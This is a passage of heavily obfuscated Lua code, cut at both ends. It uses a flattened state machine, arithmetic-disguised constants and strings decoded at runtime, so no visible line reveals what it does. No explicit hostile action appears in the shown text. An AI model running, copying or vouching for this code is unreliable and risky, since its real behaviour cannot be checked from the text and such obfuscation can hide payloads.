q=Z[t[-531764-(-531765)]]h=Z[t[907744-907742]]d=h(z,p)c=q[d]r=E(-946428-(-939355))G=E(284965-291865)d=E(401042+-407968)Q=25444704388623-(-878649)h=P[d]z=Z[t[-872202-(-872203)]]p=Z[t[-494225-(-494227)]]x=p(G,g)d=z[x]q=h[d]p=Z[t[-238669+238672]]G=Z[t[96811-96810]]g=Z[t[78094+-78092]]u=g(r,Q)x=G[u]z=p[x]G=E(-249031-(-241834))Q=E(-330726-(-323769))x=P[G]e=4188061969794-(-449052)g=Z[t[265204-265203]]u=Z[t[-487021+487023]]r=u(Q,e)G=g[r]p=x[G]D=nil G=997265+-997265 g=-824429+824434 u=779290+-779290 x=p(G,g,u)d=z+x h=q(d)J[c]=h h=E(913357+-920753)q=P[h]d=Z[t[-233827+233828]]G=9905964111003-(-589161)z=Z[t[963547+-963545]]x=E(-1036366+1028998)p=z(x,G)h=d[p]c=q[h]h=.05 q=c(h)c=-61228+3775250 end end else if c<-384424+7416198 then if c<778480+6098791 then if c<7318007-454305 then n=not e x=x+Q p=x<=r p=n and p n=x>=r n=e and n p=n or p n=674511+12236504 c=p and n p=-408106-(-683284)c=c or p else c=389450+13171628 o=Z[t[-494891+494897]]K=Z[t[-767164-(-767167)]]i=E(45784-53198)m=31308157453684-(-635774)k=Z[t[-2853-(-2857)]]F=k(i,m)J=K[F]K=true o[J]=K D=-745245+2790414033968 S=nil K=E(177291-184687)J=P[K]k=Z[t[-247636-(-247639)]]m=E(710807-717718)O=nil F=Z[t[-233179+233183]]i=F(m,D)K=k[i]o=J[K]J=o()end else if c<6968293-18352 then o=Z[t[978856+-978855]]J=Z[t[-311954+311956]]S=q c=E(797153-804435)k=E(-294587+287616)F=492587+10130156342850 K=J(k,F)q=o[K]i=-1016033+27451036644047 c=S[c]c=c(S,q)o=c F=E(-141688+134730)J=Z[t[188575-188574]]c=E(-103999-(-96827))c=S[c]K=Z[t[83622+-83620]]k=K(F,i)q=J[k]c=c(S,q)K=c J=c q=o c=o and 14569461-915009 or 15935228-828258 else c=q and 162227+3225183 or 16303424-(-380683)end end else if c<6531583-(-775799)then if c<662869+6528803 then K=E(-834870+827858)S=Z[t[-365970-(-365971)]]o=Z[t[523039+-523037]]k=24290992570839-(-158296)J=o(K,k)c=S[J]q={c}c=P[E(-155431+148365)]else c=514051+10023620 end else Q=11389257952027-(-420252)c=Z[t[-241850+241855]]z=-570438+27286152521192 i=Z[t[961513+-961512]]m=Z[t[-393961-(-393963)]]h=E(-252841-(-245670))d=-1026461+10200573869099 D=m(h,d)d=E(907508-914494)x=E(-1012706+1005395)F=i[D]r=E(309761+-316909)m=Z[t[104598+-104597]]q=E(676407+-683560)D=Z[t[-432961-(-432963)]]h=D(d,z)i=m[h]D=Z[t[413305+-413304]]h=Z[t[658854-658852]]z=E(97053+-104130)p=4241101590252-(-702666)d=h(z,p)m=D[d]d=Z[t[-907562+907563]]z=Z[t[523897-523895]]G=10589903477692-(-489351)p=z(x,G)h=d[p]z=Z[t[-817377+817383]]n=E(834847+-842065)G=Z[t[827302-827301]]R=9495254492270-463657 g=Z[t[317849-317847]]u=g(r,Q)x=G[u]r=Z[t[629839+-629838]]Q=Z[t[-459195+459197]]q=c[q]e=Q(n,R)u=r[e]g=u..o G=K..g p=x..G d=z..p D=h..d k={[F]=i;[m]=D}q=q(c,k)c=639816+12659595 end end end else if c<15652+7665085 then if c<-1002296+8617543 then if c<7155819-(-296018)then if c<-709721+8140286 then i=1044063+2338866910690 S=Z[t[-755572+755574]]J=Z[t[-1015676+1015679]]F=E(638305-645649)K=Z[t[346726+-346722]]k=K(F,i)o=J[k]O=S[o]c=6750586-(-221504)q=O else q=b c=f c=83519+3613770 end else if c<829477+6699672 then D=31606781758080-(-929534)k=Z[t[-365753-(-365756)]]m=E(853211+-860344)F=Z[t[-662913-(-662917)]]i=F(m,D)K=k[i]J=S[K]K=-718849+718849 o=J>K c=o and 12369088-381977 or 2546495-(-780398)else b=Z[S]c=b and 6182624-793221 or 2800857-(-896432)q=b end end else if c<696924+6964311 then if c<7947688-316675 then q=E(624801-632086)S=W(1036335+12261543,{t[-545231+545232]})c=P[q]o={c(S)}q=o[607858+-607857]S=q O=o[149154+-149152]o=C()Z[o]=O O=not S c=O and 10867735-(-372103)or-1009538+7214019 q=O else m=Z[t[-960650+960651]]D=Z[t[-49432-(-49434)]]z=-204086+176495435144 d=E(965290-972202)K=o h=D(d,z)i=m[h]F=k[i]i=Z[t[521878-521875]]c=F==i c=c and 12745604-23394 or 467969+9947194 end else c=q and 688765+15225217 or 479674+2945982 end end else if c<8221833-461086 then if c<6840199-(-855976)then if c<8101972-417960 then c=false Z[t[-99170-(-99173)]]=c c=13507019-868249 else S=E(-1007763-(-1000849))q=31702+9444570 o=12643436-124677 O=S^o c=q-O q=E(42099-49375)O=c c=q/O q={c}c=P[E(-610572-(-603500))]end else if c<628195+7114110 then m=645078-644823 i=-3201+3201 c=Z[t[-325120-(-325121)]]S=o F=c(i,m)c=-14140+3414898 O[S]=F S=nil else r=E(189259-196339)c=P[r]r=E(-593283-(-586353))P[r]=c c=-284205+7583119 end end else if c<-10497+7876160 then if c<-200300+7972721 then q={}c=P[E(992671-999647)]else F=E(739723-746966)k=P[F]d=993734+28221837691279 i=Z[t[-169999-(-170001)]]h=E(-213343+206344)m=Z[t[-519670-(-519673)]]D=m(h,d)d=18877085492687-(-277639)F=i[D]q=k[F]h=E(-213569+206310)i=Z[t[685346-685344]]m=Z[t[165619-165616]]D=m(h,d)F=i[D]k=q(F)d=31734680021805-668020 G=-804637+11340325641149 h=E(380229-387157)Z[t[340127-340123]]=k q=Z[t[394248+-394244]]i=Z[t[-86651+86653]]m=Z[t[867411+-867408]]D=m(h,d)d=-861262+2943432157608 F=i[D]i=-178817-(-268817)q[F]=i q=Z[t[748288+-748284]]h=E(444747-451753)p=E(243829+-250790)i=Z[t[1046699+-1046697]]m=Z[t[209669-209666]]D=m(h,d)F=i[D]D=E(-823193-(-815996))x=19538166053149-(-289389)m=P[D]h=Z[t[-286042+286044]]d=Z[t[-932554+932557]]z=d(p,x)d=9000203340-203340 D=h[z]i=m[D]h=16780+8999983220 D=842910+8999157090 x=7348942955837-(-141345)p=E(-630369-(-623373))m=i(D,h,d)q[F]=m q=Z[t[-497264+497268]]i=Z[t[526164+-526162]]m=Z[t[782589-782586]]d=25451202686052-(-487)h=E(-609149-(-601828))D=m(h,d)F=i[D]m=Z[J]h=Z[t[190891+-190889]]d=Z[t[-403501+403504]]z=d(p,x)D=h[z]z=-875810+32359885215742 h=E(437865+-445188)i=m[D]x=E(450737-458004)q[F]=i d=25994323820142-298790 q=Z[t[-979745+979749]]i=Z[t[-30866-(-30868)]]m=Z[t[-271150+271153]]D=m(h,d)F=i[D]i=Z[J]q[F]=i i=E(-547598+540355)F=P[i]d=E(-309672+302347)m=Z[t[598352-598350]]D=Z[t[530151-530148]]h=D(d,z)i=m[h]q=F[i]d=E(-555243+547901)z=-831170+9524304445461 m=Z[t[189187-189185]]D=Z[t[-560576-(-560579)]]h=D(d,z)i=m[h]F=q(i)Z[t[-1046561+1046566]]=F q=Z[t[893961+-893956]]z=23046448244144-392133 m=Z[t[-531294+531296]]d=E(111065+-118464)D=Z[t[855110-855107]]h=D(d,z)i=m[h]h=E(757756+-764953)D=P[h]d=Z[t[-890003+890005]]z=Z[t[795402-795399]]p=z(x,G)z=905505+8999094495 h=d[p]m=D[h]G=6428406366082-586705 d=9000916016-916016 x=E(-293978+286855)h=9000076183-76183 D=m(h,d,z)d=E(-71698+64538)q[i]=D q=Z[t[-41094-(-41099)]]m=Z[t[-527681+527683]]z=206134+9556810787884 D=Z[t[285929+-285926]]h=D(d,z)i=m[h]h=E(792738-799935)D=P[h]d=Z[t[646519+-646517]]z=Z[t[-629909-(-629912)]]p=z(x,G)h=d[p]m=D[h]d=E(-552368-(-545063))q[i]=m q=Z[t[-318772-(-318777)]]z=23616906966371-(-46482)m=Z[t[662644-662642]]D=Z[t[973361-973358]]h=D(d,z)i=m[h]d=E(-106272+99249)z=13106572834336-(-287159)m=Z[J]q[i]=m q=Z[K]m=Z[t[617467-617465]]D=Z[t[784230+-784227]]h=D(d,z)i=m[h]m=true q[i]=m p=-449380+14851545134695 i=E(28686-35807)z=E(374728-382129)q=P[i]D=Z[t[-312016-(-312018)]]h=Z[t[35927-35924]]d=h(z,p)m=D[d]i=E(-743867+736920)i=q[i]i=i(q,m)p=103282335068-154924 D=Z[t[-959755+959757]]z=E(-474307+467133)h=Z[t[-340471-(-340474)]]d=h(z,p)m=D[d]x=-946775+31095287425766 z=E(913003-920369)q=i[m]D=V(13873487-320589,{t[503209+-503207];t[753750-753747];t[537094+-537088],t[-810358-(-810365)]})m=E(478445-485707)m=q[m]p=-290152+22642933143191 m=m(q,D)D=Z[t[123154-123152]]h=Z[t[-1015024+1015027]]d=h(z,p)m=D[d]q=i[m]D=W(766270-273021,{t[595880-595878];t[-236475-(-236478)];t[-272014+272020];t[47127-47120]})m=E(746323-753585)p=E(860482+-867713)m=q[m]m=m(q,D)D=E(516040+-523436)c=-267092+16921249 m=P[D]h=Z[t[-287396+287398]]d=Z[t[579237+-579234]]z=d(p,x)D=h[z]q=m[D]i=nil D=H(72983+3020518,{t[498098+-498097],J,t[157366+-157364];t[50672+-50669];t[103463+-103459],K;t[762494-762488],t[1035270+-1035263],t[-1046773+1046778],t[-153546+153554]})m=q(D)end else q=E(-83699+76294)c=Z[t[373542+-373541]]q=c[q]q=q(c)c=14708277-32002 end end end end end end else if c<687277+11825328 then if c<61760+10436377 then if c<9711625-895900 then if c<9030489-672757 then if c<7078022-(-1015479)then if c<7729173-(-344011)then if c<-863979+8923906 then i=Z[K]F=not i q=F c=160126+16205542 else q=E(-819895+812569)c=P[q]O=Z[t[321546-321545]]q=c(O)c=P[E(831820-838921)]q={}end else if c<9078360-993855 then S=Z[t[694164+-694161]]J=Z[t[163108+-163107]]K=Z[t[988973-988971]]F=E(-856757-(-849704))i=208904+15230173899692 k=K(F,i)o=J[k]F=E(377637+-384888)O=S[o]J=Z[t[-941647-(-941648)]]c=13390598-(-117306)i=16272449775559-(-95698)K=Z[t[-922486-(-922488)]]S=E(-854088+846806)k=K(F,i)o=J[k]S=O[S]S=S(O,o)q=S else z=E(995174-1002424)d=P[z]R=E(603714-610917)I=8234420131923-297305 r=Z[S]Q=Z[J]n=Q(R,I)R=10570983571490-(-791320)x=r[n]p=i[x]z=d(p)y=-427183+20305333414302 x=Z[S]r=Z[J]n=E(722192-729478)M=14551593797978-(-839966)Q=r(n,R)n=E(361264-368295)r=E(672059+-679309)p=x[Q]x=P[r]Q=P[n]n={Q()}r=x(a(n))n=Z[S]R=Z[J]x=E(641272+-648537)U=E(-873498+866229)I=R(U,y)Q=n[I]R=Z[S]y=E(115811+-123174)x=r[x]I=Z[J]U=I(y,M)n=R[U]c=16089643-559473 x=x(r,Q,n)d=p..x h=z..d Z[m]=h end end else if c<8355359-101965 then if c<7399266-(-844840)then O=B[901871+-901870]c=O O=nil Z[t[-265660-(-265661)]]=c c=P[E(-508831-(-501428))]q={}else n=E(-27884+20763)Q=P[n]R=Z[S]M=253147+13313275870044 y=E(-418282-(-411308))I=Z[J]U=I(y,M)n=R[U]p=Q[n]R=Z[S]y=E(859614+-866552)M=-824298+24574303010973 l=-70570+26279640662903 I=Z[J]U=I(y,M)n=R[U]A=-729307+30263447410663 U=Z[S]w=E(884857-892137)y=Z[J]M=y(w,A)I=U[M]A=E(399871-406763)y=Z[S]M=Z[J]j=-659350+22669956479186 w=M(A,l)U=y[w]M=Z[S]w=Z[J]l=E(96646-103528)A=w(l,j)y=M[A]M=r w=c c=r and-691687+13046253 or-802035+17109479 end else if c<7880770-(-434896)then h=E(676899-684155)z=25041181813029-850841 F=E(-137213+130330)k=P[F]c=E(178768+-185761)d=25780339969977-696533 x=173775646060-(-742116)i=Z[t[-51003+51004]]m=Z[t[179349+-179347]]D=m(h,d)F=i[D]K=k[F]F=Z[t[-1025392-(-1025393)]]c=o[c]D=E(701614+-708562)i=Z[t[-703613+703615]]h=-436528+7256131368546 m=i(D,h)i=-1033969+33041520018187 k=F[m]m=E(-789682+782535)q=K[k]c=c(o,q)F=E(-778350+770952)d=E(-47515-(-40374))q=Z[t[-281355+281356]]K=Z[t[941615+-941613]]k=K(F,i)c=q[k]K=E(316917-324160)q=true o[c]=q D=21514205700950-15412 q=P[K]k=Z[t[673860+-673859]]F=Z[t[-138325-(-138327)]]i=F(m,D)K=k[i]c=q[K]m=E(602374-609734)k=Z[t[-629653+629654]]F=Z[t[310127+-310125]]D=-493850+33296142189994 i=F(m,D)K=k[i]q=c(K)K=C()D=-470883+3517255202248 Z[K]=q m=E(-255309+247962)c=Z[K]k=Z[t[933321-933320]]F=Z[t[-225597-(-225599)]]i=F(m,D)q=k[i]i=E(-273497+266300)F=P[i]m=Z[t[-958564+958565]]D=Z[t[-892794-(-892796)]]h=D(d,z)i=m[h]m=-559235-(-559236)k=F[i]D=-680108-(-680116)i=527285+-527277 F=k(i,m,D)c[q]=F c=Z[K]k=Z[t[-831593+831594]]D=740097+34578536444900 F=Z[t[15629-15627]]m=E(425755-432968)i=F(m,D)q=k[i]k=true m=E(937056-944067)c[q]=k c=Z[K]D=133855+22036217273654 k=Z[t[710753-710752]]F=Z[t[130460+-130458]]i=F(m,D)m=E(-176390-(-169423))q=k[i]k=217484-217483 c[q]=k c=Z[K]D=22164648693467-517770 k=Z[t[-637938+637939]]F=Z[t[-921332-(-921334)]]i=F(m,D)q=k[i]m=E(491640-498969)k=true p=5440499170054-(-708319)c[q]=k c=Z[K]k=Z[t[-565613-(-565614)]]D=629792+19096706467484 F=Z[t[466284-466282]]z=E(1014282+-1021161)i=F(m,D)q=k[i]i=Z[t[255412-255409]]D=Z[t[-836210+836211]]h=Z[t[-954600-(-954602)]]d=h(z,p)m=D[d]F=i[m]D=E(691649+-698846)m=P[D]h=Z[t[906469+-906468]]d=Z[t[-172356-(-172358)]]p=E(-808533+801246)z=d(p,x)D=h[z]i=m[D]d=174124-174124 D=-183976+183976 h=-1036850-(-1036853)m=i(D,h,d)k=F-m m=E(1008302-1015684)c[q]=k c=Z[K]h=E(882736-890082)k=Z[t[395277-395276]]D=-974694+10294006100511 F=Z[t[22028+-22026]]i=F(m,D)F=E(64190-71582)q=k[i]k=P[F]c[q]=k m=11825318975836-(-637990)q=Z[t[552542+-552541]]k=Z[t[-243916+243918]]i=E(948788+-955955)F=k(i,m)d=14015282635556-84390 c=q[F]F=E(-576901+569704)k=P[F]i=Z[t[-461837-(-461838)]]m=Z[t[-360097-(-360099)]]D=m(h,d)h=E(803641-810800)F=i[D]q=k[F]J[c]=q m=7425116303004-(-466661)q=Z[t[178566+-178565]]i=E(-143621+136404)k=Z[t[-105586+105588]]F=k(i,m)c=q[F]F=E(-186725+179528)d=275603+7957790841318 k=P[F]i=Z[t[275478+-275477]]m=Z[t[434966+-434964]]D=m(h,d)F=i[D]q=k[F]i=E(555375+-562430)m=24028+2748346574627 h=E(-644530-(-637284))J[c]=q q=Z[t[-896828+896829]]k=Z[t[-809860-(-809862)]]F=k(i,m)c=q[F]F=E(-377073-(-369876))k=P[F]d=15314548572673-140838 i=Z[t[658589-658588]]m=Z[t[-250972-(-250974)]]D=m(h,d)F=i[D]q=k[F]J[c]=q q=-831144-(-831145)k=294044-294034 F=k k=910465+-910464 c=4176155-462133 i=k k=244536-244536 m=i<k k=q-i else J=Z[t[48231-48225]]D=72618+7808257667722 k=Z[t[-495503-(-495506)]]m=E(132015+-139330)F=Z[t[826377+-826373]]c=1038377+13560435 i=F(m,D)K=k[i]o=J[K]O=o end end end else if c<30899+8515371 then if c<-614487+9061978 then if c<7358863-(-1016846)then B_=T_ Z_=C()L_=E(341931-348923)Z[Z_]=q_ q_=Z_ C_=Z[S]S_=Z[J]K_=13841506753286-590297 J_=S_(L_,K_)o_=C_[J_]c=761699+855174 S_=Z[q_]L_=Z[S]K_=Z[J]W_=E(355022+-362120)V_=593699+32315483138981 s_=K_(W_,V_)J_=L_[s_]B_=nil C_=S_[J_]J_=Z[S]s_=E(499424-506310)W_=31316843931727-323416 L_=Z[J]Z_=E(-257162-(-249758))K_=L_(s_,W_)Z_=E_[Z_]S_=J_[K_]J_=X(14228017-(-401850),{S,J;q_})O_={[o_]=C_,[S_]=J_}Z_=Z_(E_,O_)q_=L(q_)else k=E(-946374+938978)h=-69784+661080641995 z=4405512350562-549727 Q=3549761401237-(-726239)p=690778+32506688949 q=P[k]F=Z[t[16248+-16247]]i=Z[t[-653676+653678]]D=E(-850112-(-842911))m=i(D,h)i=E(560142-567461)d=E(774411+-781465)k=F[m]c=q[k]m=-809612+28900896247582 k=.2 q=c(k)q=Z[t[-972960+972961]]k=Z[t[159254+-159252]]F=k(i,m)c=q[F]J=nil q=false o[c]=q i=E(129405+-136288)F=P[i]m=Z[t[-798452+798453]]D=Z[t[595519-595517]]h=D(d,z)i=m[h]k=F[i]d=599617+6456156562813 i=Z[t[62849+-62848]]h=E(160862+-168054)m=Z[t[-754759+754761]]S=nil c=E(-209910-(-202917))D=m(h,d)c=o[c]h=885072+6908680768321 F=i[D]q=k[F]k=E(-973945+966549)d=E(318744+-325812)c=c(o,q)q=P[k]F=Z[t[153990+-153989]]D=E(-178777-(-171422))i=Z[t[-133813+133815]]m=i(D,h)k=F[m]h=2175359921529-(-579195)G=E(712856-719800)c=q[k]F=W(7577298-(-871741),{K})k=667202+-667200 q=c(k,F)k=E(126895-134016)z=14164811671027-(-914385)q=P[k]O=nil x=-914991+18566330947572 K=L(K)D=E(-951214-(-944122))F=Z[t[-317676+317677]]i=Z[t[-274284-(-274286)]]m=i(D,h)k=F[m]c=q[k]h=331657+32236496104218 F=Z[t[335032+-335031]]i=Z[t[-1012369+1012371]]D=E(749091+-756256)m=i(D,h)k=F[m]m=Z[t[487370-487369]]D=Z[t[469696-469694]]h=D(d,z)q=E(-489757+482814)i=m[h]D=Z[t[964002+-964001]]h=Z[t[-96666+96668]]z=E(344609-351693)d=h(z,p)g=-878801+12276583055141 m=D[d]p=E(-1029546-(-1022471))h=Z[t[529396+-529395]]d=Z[t[-772534+772536]]z=d(p,x)D=h[z]z=Z[t[-950434-(-950435)]]p=Z[t[124062-124060]]r=E(459925-467071)x=p(G,g)d=z[x]p=Z[t[417897-417894]]G=Z[t[-718907+718908]]g=Z[t[74548+-74546]]u=g(r,Q)g=411039+8423138478515 x=G[u]G=E(-401216+393968)z=p[x]h=d..z o=nil z=Z[t[946371-946370]]p=Z[t[1008477+-1008475]]x=p(G,g)q=c[q]d=z[x]z=634717+-634714 F={[i]=m;[D]=h,[d]=z}q=q(c,k,F)c=P[E(566988-573954)]q={}end else if c<-23074+8539693 then c=Z[t[583176-583175]]c=c and 7039524-(-840402)or 1037101+13639174 else O=B[-209825-(-209826)]c=O Z[t[-109468-(-109469)]]=c J=E(-331546-(-324425))m=9592474489188-557042 i=E(-440307-(-433250))D=470635+15625217568257 o=P[J]K=Z[t[818538+-818536]]k=Z[t[96050-96047]]F=k(i,m)J=K[F]i=109546+13302204050504 F=E(-996311-(-989417))S=o[J]J=Z[t[692914+-692912]]K=Z[t[959678-959675]]k=K(F,i)m=E(-48431-(-41210))o=J[k]q=S[o]o=c S=q k=Z[t[-619375-(-619377)]]F=Z[t[586760-586757]]i=F(m,D)K=k[i]J=S[K]q=J c=J and 1012194+14426451 or-308109+426164 end end else if c<-816625+9467775 then if c<8473622-(-92203)then c=15912605-524012 else m=E(573440-580681)i=P[m]z=E(915410+-922428)m=i(O)D=Z[t[-841927+841929]]p=615404+33761572739453 h=Z[t[-61162-(-61165)]]d=h(z,p)i=D[d]F=m~=i K=F c=15168215-746497 end else c=q and 4323261-777188 or 4857798-226722 end end end else if c<-143142+9640089 then if c<8889588-(-172437)then if c<9263328-311099 then if c<7998870-(-882690)then O=Z[t[983754+-983753]]q=#O O=-717472+717472 c=q==O c=c and 1640388-797307 or 620207+5080780 else o=-1031255+1031287 S=Z[t[-600739-(-600742)]]O=S%o h=761353+-761340 J=Z[t[-400643+400647]]F=Z[t[-780661+780663]]p=Z[t[296929-296926]]m=537650+-537648 z=p-O p=688965-688933 d=z/p D=h-d i=m^D m=-454988+455244 k=F/i K=J(k)J=-106262+4295073558 i=871956+-871955 o=K%J h=171903-171647 K=-676576+676578 J=K^O S=o/J J=Z[t[253843-253839]]F=S%i i=-668377+4295635673 k=F*i K=J(k)J=Z[t[-184498-(-184502)]]k=J(S)o=K+k K=36825+28711 J=o%K F=-702035+767571 k=o-J c=6733417-1032430 o=nil K=k/F O=nil S=nil F=376414+-376158 k=J%F i=J-k F=i/m J=nil m=-942333+942589 i=K%m D=K-i m=D/h K=nil D={k,F,i;m}m=nil F=nil k=nil i=nil Z[t[-244702-(-244703)]]=D end else if c<-124329+9172705 then q=Z[t[-793933-(-793937)]]c=q and 15405927-(-423357)or 17334936-633752 else A=L(A)Z_=E(-495134-(-488162))O_=149158+11670747106964 N_=Z[S]T_=Z[J]F_=-475014+7667427396984 Y_=5877087708717-318333 X_=E(-223935-(-216721))q_=T_(Z_,O_)B_=E(734776+-742036)t_=N_[q_]N_=nil B_=U[B_]o_=25585980066437-531451 W_=50304+30587787031331 V_=-184463+30767454554246 B_=B_(U,t_,N_)t_=E(923516+-930838)T_=Z[S]q_=Z[J]O_=E(-754641+747309)Z_=q_(O_,o_)t_=B_[t_]N_=T_[Z_]s_=E(876642+-883709)T_=true t_=t_(B_,N_,T_)O_=nil Z_=C()N_=C()t_=false Z[N_]=t_ t_=551874+-551774 T_=C()v_=30761562444677-(-1025135)q_=false Z[T_]=t_ o_=C()t_=false Z[Z_]=t_ k_=1027699+15346955873655 t_=C()Z[t_]=q_ H_=348855+31026479064504 q_=nil Z[o_]=q_ q_=C()Z[q_]=O_ J_=Z[S]L_=Z[J]K_=L_(s_,W_)S_=J_[K_]L_=Z[S]K_=Z[J]W_=E(864436+-871790)s_=K_(W_,V_)a_=nil J_=L_[s_]K_=Z[S]O_=E(732198-739371)V_=E(-552360-(-545206))s_=Z[J]W_=s_(V_,H_)O_=B_[O_]L_=K_[W_]K_=false d_=26092375759649-(-103509)W_=Z[S]V_=Z[J]H_=V_(X_,v_)v_=E(413127-420026)s_=W_[H_]V_=Z[S]H_=Z[J]D_=E(776335-783663)X_=H_(v_,Y_)Y_=E(-486654+479237)W_=V_[X_]H_=Z[S]X_=Z[J]v_=X_(Y_,F_)V_=H_[v_]H_=X(472106+8070981,{N_,S,J,o_;q_;Z_,t_,T_})C_={[S_]=J_;[L_]=K_;[s_]=W_;[V_]=H_}q_=L(q_)Y_=E(421054-428277)W_=-215646+389331340051 s_=E(-284267+277020)O_=O_(B_,C_)H_=-317980+5254152053674 J_=Z[S]L_=Z[J]K_=L_(s_,W_)O_=E(-318308-(-310904))S_=J_[K_]V_=192836+19287478317521 L_=Z[S]c_=nil W_=E(530781+-537971)K_=Z[J]s_=K_(W_,V_)v_=-115985+17629780092194 i_=917261+27967931659218 X_=E(29094+-36013)J_=L_[s_]V_=E(-446402+439453)K_=Z[S]O_=B_[O_]s_=Z[J]W_=s_(V_,H_)L_=K_[W_]H_=9754214309563-(-176899)K_=s(521307+9398340,{Z_,S,J})W_=44886+11278228661549 C_={[S_]=J_;[L_]=K_}O_=O_(B_,C_)J_=Z[S]s_=E(393109-400503)V_=-615842+16809637282869 L_=Z[J]K_=L_(s_,W_)S_=J_[K_]L_=Z[S]W_=E(811982-819077)F_=-714612+11100347579301 P_=nil K_=Z[J]s_=K_(W_,V_)V_=E(34348-41546)J_=L_[s_]K_=Z[S]s_=Z[J]O_=E(-12777-(-5373))O_=B_[O_]W_=s_(V_,H_)s_=E(-768843-(-761713))L_=K_[W_]K_=H(637096+11411885,{t_,S;J})C_={[S_]=J_;[L_]=K_}O_=O_(B_,C_)W_=18631951541803-(-654265)J_=Z[S]c=34387+1386715 L_=Z[J]V_=5665128221095-(-655527)H_=979737+25146012220068 K_=L_(s_,W_)S_=J_[K_]L_=Z[S]W_=E(-685542+678416)Z_=L(Z_)K_=Z[J]o_=L(o_)s_=K_(W_,V_)V_=E(684228-691571)J_=L_[s_]j=L(j)l=nil K_=Z[S]s_=Z[J]m_=26738620219278-118507 N_=L(N_)W_=s_(V_,H_)h_=865787+11976305532877 s_=-437826+437827 L_=K_[W_]W_=-121629-(-122129)n=nil K_={s_,W_}W_=Z[S]V_=Z[J]y=nil H_=V_(X_,v_)s_=W_[H_]H_=Z[S]X_=Z[J]W_=491369+-491368 v_=X_(Y_,F_)V_=H_[v_]F_=E(-680552+673333)X_=Z[S]O_=E(359285-366239)v_=Z[J]t_=L(t_)Y_=v_(F_,k_)O_=B_[O_]H_=X_[Y_]v_=Z[S]Y_=Z[J]k_=E(-688598-(-681583))F_=Y_(k_,i_)X_=v_[F_]v_=-771825+771925 F_=Z[S]k_=Z[J]i_=k_(D_,d_)Y_=F_[i_]k_=Z[S]d_=E(899742+-907082)i_=Z[J]D_=i_(d_,h_)E_=nil U=nil h_=E(856496-863411)F_=k_[D_]M=nil i_=Z[S]D_=Z[J]d_=D_(h_,m_)k_=i_[d_]i_=X(7359629-(-747187),{T_})C_={[S_]=J_,[L_]=K_,[s_]=W_;[V_]=H_,[X_]=v_;[Y_]=F_;[k_]=i_}T_=L(T_)O_=O_(B_,C_)X_=25612589308708-(-496498)W_=E(745380-752511)O_=Z[I]B_=nil V_=-6836+19006605901126 L_=Z[S]K_=Z[J]s_=K_(W_,V_)Y_=-329352+15429016806040 V_=E(-526644+519719)J_=L_[s_]K_=Z[S]s_=Z[J]H_=9188+23457200572103 W_=s_(V_,H_)H_=E(1017678+-1024877)L_=K_[W_]s_=Z[S]W_=Z[J]v_=E(-570733-(-563728))V_=W_(H_,X_)K_=s_[V_]V_=Z[S]H_=Z[J]X_=H_(v_,Y_)v_=E(737011-744206)W_=V_[X_]s_=W_..R V_=Z[S]H_=Z[J]Y_=-85921+10008682406357 X_=H_(v_,Y_)W_=V_[X_]C_=E(742739-749699)V_=-492941+492946 C_=O_[C_]S_={[J_]=L_,[K_]=s_,[W_]=V_}W_=20172923379257-(-575096)C_=C_(O_,S_)S_=E(797213-804609)C_=P[S_]J_=Z[S]L_=Z[J]s_=E(-1044797+1037887)K_=L_(s_,W_)S_=J_[K_]O_=C_[S_]S_=W(10050447-(-937716),{S;J,d;z;w;p,I})C_=O_(S_)w=L(w)I=L(I)end end else if c<10115330-712887 then if c<9624992-449720 then K=Z[t[402561-402560]]i=E(309348+-316368)k=Z[t[864270-864268]]m=368773+21842270439222 F=k(i,m)J=K[F]o=S[J]c=-39679-(-223489)J=E(-640111-(-633024))J=o[J]J=J(o)q=J else c=i and-260624+10017264 or 564446+1147982 end else q=E(-521645+514725)k=10403801331121-533189 F=18980086620023-48369 h=507184+12542535391648 c=P[q]S=Z[t[-131422+131423]]K=E(-551876+544733)o=Z[t[454740-454738]]J=o(K,k)q=S[J]S=true d=-334727+21091665428964 k=E(-603946-(-597009))c[q]=S S=E(428015+-435136)D=-103083+16578932109523 q=P[S]o=Z[t[604889-604888]]J=Z[t[980831-980829]]K=J(k,F)F=13609532062196-516403 S=o[K]c=q[S]o=Z[t[215719-215718]]J=Z[t[-749836+749838]]k=E(622912+-630040)i=E(67609-75011)K=J(k,F)m=7114598771387-(-74293)S=o[K]K=Z[t[-366637-(-366638)]]k=Z[t[-777923-(-777925)]]F=k(i,m)q=E(-819954-(-813011))J=K[F]m=E(148785-156017)k=Z[t[602917+-602916]]F=Z[t[392458-392456]]i=F(m,D)D=E(-1040551+1033511)K=k[i]q=c[q]F=Z[t[36514-36513]]i=Z[t[462941+-462939]]m=i(D,h)k=F[m]h=E(117682-124804)i=Z[t[-126028-(-126029)]]m=Z[t[-963201+963203]]D=m(h,d)F=i[D]d=E(-906554-(-899449))m=Z[t[-512329+512330]]z=-570025+20590844827677 D=Z[t[968128+-968126]]h=D(d,z)i=m[h]m=-694683-(-694688)o={[J]=K;[k]=F;[i]=m}F=-629026+30987390423423 q=q(c,S,o)m=30730111664540-(-390729)q=E(486166+-493287)k=E(-297830+290559)c=P[q]o=Z[t[838924-838923]]J=Z[t[-794446-(-794448)]]K=J(k,F)q=E(-725326+718379)S=o[K]q=c[q]i=E(863077-870341)q=q(c,S)S=q J=E(-587504-(-580383))o=P[J]K=Z[t[217986-217985]]k=Z[t[749788-749786]]F=k(i,m)J=K[F]i=13709377364692-248293 q=o[J]F=E(-41698-(-34406))J=Z[t[898160-898159]]K=Z[t[-455739+455741]]k=K(F,i)F=E(720026-727322)o=J[k]c=q[o]o=C()Z[o]=c i=936967+27561146770971 J=Z[t[-258061-(-258062)]]K=Z[t[58358-58356]]k=K(F,i)q=J[k]J=X(-7168+5028163,{t[-264669+264670],t[635175-635173];o})c=S[q]o=L(o)q=E(315581+-322843)q=c[q]q=q(c,J)c=-94356+5155104 S=nil end end else if c<-904590+11093526 then if c<1035767+8937064 then if c<10467601-643040 then i=Z[t[-585725+585726]]p=3782343454307-(-366718)d=34683+17729728436421 h=E(55757+-62828)m=Z[t[-127169+127171]]D=m(h,d)x=17266268512466-328042 z=E(-852738-(-845465))c=i[D]D=Z[t[723185-723184]]h=Z[t[864822+-864820]]d=h(z,p)p=E(-799552+792643)m=D[d]i=k[m]h=Z[t[891203-891202]]d=Z[t[-147252+147254]]z=d(p,x)D=h[z]m=k[D]q={c,i;m}c=P[E(150843+-157879)]else c=true Z[t[869349+-869348]]=c S=E(-222893-(-215497))k=E(1042742+-1049733)O=P[S]F=194955+21192243014913 